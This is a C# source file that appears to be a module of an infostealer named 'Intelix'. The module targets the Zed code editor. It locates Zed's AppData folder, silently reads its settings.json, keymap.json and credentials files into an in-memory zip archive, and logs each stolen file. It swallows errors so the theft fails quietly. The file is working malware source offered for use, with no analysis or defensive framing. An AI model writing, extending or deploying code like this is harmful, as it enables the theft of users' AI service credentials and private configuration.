using System;
using System.IO;
using Intelix.Helper.Data;

namespace Intelix.Targets.AI_Agent
{
    public class Zed : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string zedDir = Path.Combine(appdata, "Zed");
            if (!Directory.Exists(zedDir)) return;
            var entry = new Counter.CounterApplications { Name = "Zed" };
            string[] targetFiles = {
                Path.Combine(zedDir, "settings.json"),
                Path.Combine(zedDir, "keymap.json"),
                Path.Combine(zedDir, "credentials")
            };
            foreach (string file in targetFiles)
            {
                if (!File.Exists(file)) continue;
                try
                {
                    string rel = "AI-Agent\\Zed\\" + Path.GetFileName(file);
                    zip.AddFile(rel, File.ReadAllBytes(file));
                    entry.Files.Add(file + " => " + rel);
                }
                catch { }
            }
            if (entry.Files.Count > 0) counter.AI.Add(entry);
        }
    }
}
